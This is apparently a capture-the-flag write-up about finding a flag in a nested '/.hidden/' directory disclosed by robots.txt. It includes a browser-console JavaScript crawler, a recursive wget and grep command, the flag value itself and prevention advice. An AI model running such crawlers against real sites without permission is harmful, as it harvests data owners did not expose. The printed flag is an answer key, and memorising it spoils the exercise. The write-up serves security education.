# Directory Enumeration Vulnerability

## Overview
Sensitive info was hidden in deeply nested folders under `/.hidden/`. No real security—just "security through obscurity."

---

## How It Works

1. **robots.txt** gave clues:
   ```
   Disallow: /whatever
   Disallow: /.hidden
   ```
2. **Exploring `/.hidden/`** revealed:
   - README files and 3 subfolders at each level, repeating for 3 levels.

---

## Exploitation

### **Method 1: JavaScript Directory Crawler**

- Run this in your browser console:

  ```javascript
  async function findFlag() {
    const baseUrl = new URL('./.hidden/', window.location.href).href;
    const queue = [{ url: baseUrl, depth: 0 }];
    const processedUrls = new Set();
    while (queue.length > 0) {
      const { url, depth } = queue.shift();
      if (processedUrls.has(url) || depth > 3) continue;
      processedUrls.add(url);
      const response = await fetch(url);
      const html = await response.text();
      const doc = new DOMParser().parseFromString(html, 'text/html');
      for (const a of Array.from(doc.querySelectorAll('a'))) {
        if (a.textContent.trim() === 'README') {
          const readmePath = new URL(a.getAttribute('href'), url).href;
          const content = await (await fetch(readmePath)).text();
          if (content.includes('flag')) {
            console.log(`🚩 FLAG FOUND: ${content}`);
          }
        }
      }
      for (const a of Array.from(doc.querySelectorAll('a'))) {
        if (a.getAttribute('href').endsWith('/') && a.textContent !== '../') {
          queue.push({ url: new URL(a.getAttribute('href'), url).href, depth: depth + 1 });
        }
      }
    }
  }
  findFlag();
  ```

---

### **Method 2: Shell Script**

- Download everything and search for the flag:
  ```bash
  wget -r -np http://<IP_ADDRESS>/.hidden/
  grep -r "flag" .hidden/
  ```

---

## Flag

`d5eec3afc10840462a44b987e7b9c283`

---

## Security Impact

- **Info Disclosure:** Sensitive files can be found by persistent attackers.
- **Automated Scraping:** Easy for bots to find everything.
- **Obscurity ≠ Security:** No real controls in place.

---

## Prevention

1. **Never rely on directory structure for security**
2. **Require authentication for sensitive data**
3. **Use proper authorization checks**
4. **robots.txt is NOT a security tool**
5. **Disable directory listing on servers**

---